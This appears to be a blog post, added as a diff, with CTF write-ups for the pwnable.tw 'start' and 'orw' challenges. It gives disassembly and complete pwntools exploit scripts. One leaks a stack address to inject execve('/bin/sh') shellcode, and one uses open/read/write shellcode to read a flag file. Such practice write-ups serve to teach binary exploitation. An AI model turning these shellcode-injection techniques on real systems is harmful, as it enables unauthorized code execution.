@@ -1,0 +1,320 @@
+---
+title: "Write-ups: Pwnable.tw"
+published: 2026-02-06
+updated: 2026-02-06
+description: "Write-ups for pwnable.tw binary exploitation series."
+image: "https://github.com/CuB3y0nd/picx-images-hosting/raw/master/.7w7c85mlwe.avif"
+tags: ["Pwn", "Write-ups"]
+category: "Write-ups"
+draft: false
+---
+
+# Start
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Don't know how to start?<br />
+> Check GEF 101 - Solving pwnable.tw/start by @\_hugsy
+
+## Write-up
+
+熟悉又陌生？没错你被骗了。
+
+保护全关，泄漏栈地址打 shellcode 。
+
+```asm showLineNumbers=false
+_start
+_start      ; Segment type: Pure code
+_start      ; Segment permissions: Read/Execute
+_start      _text segment para public 'CODE' use32
+_start      assume cs:_text
+_start      ;org 8048060h
+_start      assume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing
+_start
+_start
+_start
+_start      ; int start()
+_start      public _start
+_start      _start proc near
+_start      push    esp
+_start+1    push    offset _exit
+_start+6    xor     eax, eax
+_start+8    xor     ebx, ebx
+_start+A    xor     ecx, ecx
+_start+C    xor     edx, edx
+_start+E    push    3A465443h
+_start+13   push    20656874h
+_start+18   push    20747261h
+_start+1D   push    74732073h
+_start+22   push    2774654Ch
+_start+27   mov     ecx, esp        ; addr
+_start+29   mov     dl, 14h         ; len
+_start+2B   mov     bl, 1           ; fd
+_start+2D   mov     al, 4
+_start+2F   int     80h             ; LINUX - sys_write
+_start+31   xor     ebx, ebx
+_start+33   mov     dl, 3Ch ; '<'
+_start+35   mov     al, 3
+_start+37   int     80h             ; LINUX -
+_start+39   add     esp, 14h
+_start+3C   retn
+_start+3C   _start endp ; sp-analysis failed
+_start+3C
+_exit
+_exit
+_exit      ; Attributes: noreturn
+_exit
+_exit      ; void exit(int status)
+_exit      _exit proc near
+_exit
+_exit      status= dword ptr  4
+_exit
+_exit      pop     esp
+_exit+1    xor     eax, eax
+_exit+3    inc     eax
+_exit+4    int     80h             ; LINUX - sys_exit
+_exit+4    _exit endp ; sp-analysis failed
+_exit+4
+_exit+4    _text ends
+_exit+4
+_exit+4
+_exit+4    end _start
+```
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    asm,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./start"
+HOST, PORT = "chall.pwnable.tw", 10000
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=False)
+
+
+def main():
+    launch()
+
+    target.recvuntil(b"Let's start the CTF:")
+    raw_input("DEBUG")
+    payload = flat(
+        {
+            0: b"/bin/sh\x00",
+            0x14: elf.sym["_start"] + 39,
+        },
+        filler=b"\x41",
+    )
+    target.send(payload)
+
+    stack = int.from_bytes(target.recv(4), "little")
+    binsh = stack - 0x1C
+    target.success(f"stack: {hex(stack)}")
+    target.success(f"binsh: {hex(binsh)}")
+
+    payload = flat(
+        {
+            0: asm(
+                f"""
+                mov ebx, {binsh}
+                mov eax, 0xb
+                xor ecx, ecx
+                xor edx, edx
+                int 0x80
+                """
+            ),
+            0x14: stack - 0x4,
+        },
+        filler=b"\x00",
+    )
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# orw
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Read the flag from /home/orw/flag.<br />
+> Only open read write syscall are allowed to use.
+
+## Write-up
+
+上古时代。你怀念吗？我不……
+
+分享点好东西：<https://gist.github.com/CuB3y0nd/09f6e4c3db728b9d2f4714da1cac3ca0>
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    asm,
+    context,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./orw"
+HOST, PORT = "chall.pwnable.tw", 10001
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=False)
+
+
+def main():
+    launch()
+
+    payload = asm("""
+        mov ebx, 0x804a094
+        mov ecx, 0
+        mov eax, 0x5
+        int 0x80
+
+        mov ebx, eax
+        mov ecx, esp
+        mov edx, 0x1337
+        mov eax, 0x3
+        int 0x80
+
+        mov ebx, 0x1
+        mov ecx, esp
+        mov edx, 0x1337
+        mov eax, 0x4
+        int 0x80
+    flag:
+        .ascii "/home/orw/flag\\x00"
+    """)
+    raw_input("DEBUG")
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
